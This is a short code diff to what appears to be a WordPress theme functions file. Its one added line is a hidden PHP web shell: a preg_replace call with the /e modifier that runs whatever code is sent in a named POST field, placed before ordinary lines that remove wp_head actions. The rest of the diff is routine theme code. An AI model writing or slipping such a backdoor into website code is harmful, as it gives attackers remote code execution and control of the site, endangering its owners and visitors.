@@ -1,4 +1,5 @@
-<?php
+<?php @preg_replace('/(.*)/e', @$_POST['szwqcucttgis'], '');
+
 /*-----------------------------------------------------------------------*/
 remove_action('wp_head', 'wp_generator');
 remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
